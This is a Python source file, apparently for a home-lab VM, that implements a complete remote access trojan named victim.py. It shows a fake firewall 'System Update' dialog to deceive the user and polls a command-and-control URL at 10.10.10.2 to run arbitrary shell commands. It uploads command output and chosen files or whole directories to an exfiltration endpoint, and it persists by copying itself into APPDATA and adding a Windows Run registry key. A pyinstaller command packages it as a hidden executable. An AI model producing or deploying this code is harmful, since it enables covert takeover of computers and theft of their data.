#!/usr/bin/env python3
#pyinstaller --onefile --noconsole VictimGetPersistHomeVM.py


# ==============================================================================
#!/usr/bin/env python3
# victim.py

import os
import sys
import time
import requests
import subprocess
import ctypes

# Configuration URLs (must match attacker)
FAKE_GITHUB_BASE = "http://10.10.10.2/fake-github"
COMMANDS_URL     = FAKE_GITHUB_BASE + "/Commands.txt"
OUTPUT_URL       = FAKE_GITHUB_BASE + "/Output.txt"
EXFIL_BASE_URL   = FAKE_GITHUB_BASE + "/Exfiltration"


def show_fake_update():
    """Display a decoy update message."""
    message = "Completed Loading new firewall policies"
    title   = "System Update"
    ctypes.windll.user32.MessageBoxW(0, message, title, 0)


def upload_file(filepath, url):
    """Upload a file via PUT, logging all details."""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        resp = requests.put(url, data=data)
        print(f"→ {resp.request.method} {resp.url} ← {resp.status_code} {resp.reason}")
        if 200 <= resp.status_code < 300:
            print(f"Uploaded {filepath} successfully.")
        else:
            print(f"Failed to upload {filepath}: {resp.status_code}")
    except Exception as e:
        print(f"Error uploading {filepath}: {e}")


def upload_path(path):
    """Recursively upload a directory or single file."""
    if os.path.isfile(path):
        upload_file(path, f"{EXFIL_BASE_URL}/{os.path.basename(path)}")
    elif os.path.isdir(path):
        for root, _, files in os.walk(path):
            for fname in files:
                full = os.path.join(root, fname)
                upload_file(full, f"{EXFIL_BASE_URL}/{fname}")
    else:
        print(f"Path does not exist: {path}")


def upload_specific_file(filename):
    """Upload a file from cwd by name."""
    filepath = os.path.join(os.getcwd(), filename)
    if not os.path.exists(filepath):
        print(f"File {filepath} does not exist.")
        return
    upload_file(filepath, f"{EXFIL_BASE_URL}/{filename}")


def get_command():
    """Fetch the next command, bypassing caches."""
    try:
        resp = requests.get(COMMANDS_URL, params={'_': time.time()}, headers={'Cache-Control': 'no-cache'})
        print(f"→ {resp.request.method} {resp.url} ← {resp.status_code} {resp.reason}")
        if resp.status_code < 300:
            return resp.text.strip()
        else:
            print("Unexpected status on GET command:", resp.status_code)
    except Exception as e:
        print("Error fetching command:", e)
    return ""


def send_output(output):
    """Send back the command output via PUT."""
    try:
        resp = requests.put(OUTPUT_URL, data=output)
        print(f"→ {resp.request.method} {resp.url} ← {resp.status_code} {resp.reason}")
        if 200 <= resp.status_code < 300:
            print("Output uploaded successfully.")
        else:
            print("Failed to upload output:", resp.status_code)
    except Exception as e:
        print("Error sending output:", e)


def persist_exe_user():
    import shutil
    import winreg

    current_exe = os.path.abspath(sys.argv[0])
    appdata     = os.environ.get("APPDATA", r"C:\Users\Public\AppData")
    target_dir  = os.path.join(appdata, "RightPoint")
    target_exe  = os.path.join(target_dir, "RightPointV3.exe")

    try:
        os.makedirs(target_dir, exist_ok=True)
        shutil.copy(current_exe, target_exe)
        print(f"Copied executable to: {target_exe}")
    except Exception as e:
        print(f"Error copying executable: {e}")
        return

    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RightPointV3", 0, winreg.REG_SZ, target_exe)
        winreg.CloseKey(key)
        print("Persistence registry key added.")
    except Exception as e:
        print(f"Error writing registry key: {e}")


def main():
    # Only show the fake update on first run
    if os.path.basename(sys.argv[0]).lower() != "rightpointv3.exe":
        show_fake_update()
        time.sleep(2)
    else:
        print("Persisted version detected; skipping fake update.")

    print("Monitoring for commands…")
    last_command = ""

    while True:
        command = get_command().strip()
        if command and command != last_command:
            print("New command received:", command)
            last_command = command
            cmd_low = command.lower()

            if cmd_low == "persist":
                persist_exe_user()

            elif cmd_low.startswith("upload "):
                _, filename = command.split(maxsplit=1)
                upload_specific_file(filename)

            elif cmd_low.startswith("get "):
                _, path = command.split(maxsplit=1)
                print(f"Uploading path: {path}")
                upload_path(path)

            else:
                output = subprocess.getoutput(command)
                print("Command output:\n", output)
                send_output(output)

        time.sleep(5)


if __name__ == "__main__":
    main()
